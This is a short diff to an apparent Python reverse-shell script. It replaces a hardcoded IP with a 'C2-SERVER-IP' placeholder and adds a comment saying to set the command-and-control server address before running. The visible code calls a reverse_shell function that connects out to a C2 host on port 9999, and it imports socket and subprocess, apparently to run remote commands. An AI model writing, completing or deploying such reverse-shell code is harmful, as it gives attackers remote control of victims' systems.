@@ -1,3 +1,5 @@
+# Be sure to change the C2-SERVER-IP before running
+
 import socket
 import subprocess
 import os
@@ -33,6 +35,6 @@ def reverse_shell(server_ip, server_port):
 
 if __name__ == "__main__":
     # Replace these with the actual IP and port of your C2 server
-    SERVER_IP = '172.17.0.1'
+    SERVER_IP = 'C2-SERVER-IP'
     SERVER_PORT = 9999
     reverse_shell(SERVER_IP, SERVER_PORT)
